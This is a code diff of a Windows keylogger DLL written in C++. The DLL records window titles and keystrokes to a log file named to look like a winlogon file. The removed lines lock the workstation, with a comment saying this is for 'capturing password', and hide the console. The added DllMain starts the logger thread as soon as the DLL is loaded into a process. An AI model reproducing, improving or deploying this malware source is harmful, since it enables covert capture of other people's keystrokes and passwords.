@@ -6,8 +6,7 @@
 
 // log_file path can be changed
 // TODO: Connect to a remote server
-LPCTSTR directoryPath = L"C:\\temp";
-const TCHAR* log_file = L"C:\\temp\\winlogon_log.txt";
+LPCSTR log_file = "C:\\winlogon_log.txt";
 HANDLE hFile = NULL;
 HWND hWindowHandle = NULL;
 TCHAR currentWindowsName[1024] = { 0 };
@@ -21,7 +20,7 @@ SYSTEMTIME LocalTime = { 0 };
 // Write text to log file 
 void WriteToLogFile(TCHAR* text)
 {
-	hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	hFile = CreateFileA(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	WriteFile(hFile, text, wcslen(text) * sizeof(TCHAR), &bytesWritten, NULL);
 	CloseHandle(hFile);
 }
@@ -71,7 +70,7 @@ DWORD KeyLoggerMainFunction(void)
 						{
 							// Get process Id + thread Id of foreground window (for checking keyboard layout)
 							currentThreadId = GetWindowThreadProcessId(hWindowHandle, &currentProcessId);
-							hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+							hFile = CreateFileA(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 							GetLocalTime(&LocalTime);
 							_snwprintf_s(fullWindowsInformation, 1023, L"\n\n%04d/%02d/%02d %02d:%02d:%02d - {%s (%d)}\n", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond, currentWindowsName, currentProcessId);
 							// Write process + window information to log file
@@ -204,14 +203,10 @@ DWORD KeyLoggerMainFunction(void)
 
 DWORD main_logger() {
 
-	// Hide console
-	HWND hConsole = GetConsoleWindow();
-	ShowWindow(hConsole, SW_HIDE);
-	
 	// Create log file
-	CreateDirectory(directoryPath, NULL);
-	hFile = _wfopen(log_file, L"a");
-	fclose((FILE*)hFile);
+	hFile = CreateFileA(log_file, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
+	SetFilePointer(hFile, 0, 0, FILE_END);
+	CloseHandle(hFile);
 		
 
 	// Main logging function
@@ -221,23 +216,25 @@ DWORD main_logger() {
 }
 
 
-extern "C" __declspec(dllexport)
-BOOL APIENTRY  DllMain(
-	_In_ HINSTANCE hinstDLL,
-	_In_ DWORD     fdwReason,
-	_In_ LPVOID    lpvReserved
-)
+extern "C" BOOL WINAPI  DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
 {
+    switch (reason)
+    {
+    case DLL_PROCESS_ATTACH:
+        DisableThreadLibraryCalls(hInst);
+        CreateThread(NULL, 0, main_logger, 0, 0, NULL);
+        break;
 
-	if (fdwReason == DLL_PROCESS_ATTACH)
-	{
-		// Lock Workstation for capturing password
-		LockWorkStation();
-		
-		// Start Loging keyboard keys
-		main_logger();
+    case DLL_PROCESS_DETACH:
+        break;
 
-	}
+    case DLL_THREAD_ATTACH:
+        break;
 
-	return 0;
+    case DLL_THREAD_DETACH:
+        break;
+    }
+
+
+    return TRUE;
 }
